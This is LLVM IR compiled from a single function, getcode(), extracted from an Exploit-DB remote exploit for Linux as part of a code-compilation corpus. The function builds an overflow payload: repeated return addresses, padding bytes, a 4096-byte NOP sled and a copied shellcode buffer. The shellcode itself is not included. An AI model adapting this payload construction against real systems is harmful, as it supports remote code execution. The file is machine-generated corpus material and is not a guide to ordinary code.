; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_21784.c_getcode.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_21784.c_getcode.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@BUFSIZE = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [37 x i8] c"getcode(): allocating memory failed.\00", align 1
@RETADDR = common dso_local global i64 0, align 8
@x86_exec = common dso_local global i32 0, align 4

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i8* @getcode() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i8*, align 8
  store i32 0, i32* %1, align 4
  %3 = load i32, i32* @BUFSIZE, align 4
  %4 = add nsw i32 %3, 1
  %5 = call i64 @malloc(i32 %4)
  %6 = inttoptr i64 %5 to i8*
  store i8* %6, i8** %2, align 8
  %7 = icmp ne i8* %6, null
  br i1 %7, label %10, label %8

8:                                                ; preds = %0
  %9 = call i32 @printe(i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str, i64 0, i64 0), i32 1)
  br label %10

10:                                               ; preds = %8, %0
  store i32 0, i32* %1, align 4
  br label %11

11:                                               ; preds = %22, %10
  %12 = load i32, i32* %1, align 4
  %13 = load i32, i32* @BUFSIZE, align 4
  %14 = icmp ult i32 %12, %13
  br i1 %14, label %15, label %25

15:                                               ; preds = %11
  %16 = load i64, i64* @RETADDR, align 8
  %17 = load i8*, i8** %2, align 8
  %18 = load i32, i32* %1, align 4
  %19 = zext i32 %18 to i64
  %20 = getelementptr inbounds i8, i8* %17, i64 %19
  %21 = bitcast i8* %20 to i64*
  store i64 %16, i64* %21, align 8
  br label %22

22:                                               ; preds = %15
  %23 = load i32, i32* %1, align 4
  %24 = add i32 %23, 4
  store i32 %24, i32* %1, align 4
  br label %11

25:                                               ; preds = %11
  %26 = load i8*, i8** %2, align 8
  %27 = call i32 @memset(i8* %26, i32 120, i32 68)
  %28 = load i8*, i8** %2, align 8
  %29 = getelementptr inbounds i8, i8* %28, i64 68
  %30 = call i32 @memset(i8* %29, i32 144, i32 4096)
  %31 = load i8*, i8** %2, align 8
  %32 = getelementptr inbounds i8, i8* %31, i64 68
  %33 = getelementptr inbounds i8, i8* %32, i64 4096
  %34 = load i32, i32* @x86_exec, align 4
  %35 = load i32, i32* @x86_exec, align 4
  %36 = call i32 @strlen(i32 %35)
  %37 = call i32 @memcpy(i8* %33, i32 %34, i32 %36)
  %38 = load i8*, i8** %2, align 8
  ret i8* %38
}

declare dso_local i64 @malloc(i32) #1

declare dso_local i32 @printe(i8*, i32) #1

declare dso_local i32 @memset(i8*, i32, i32) #1

declare dso_local i32 @memcpy(i8*, i32, i32) #1

declare dso_local i32 @strlen(i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
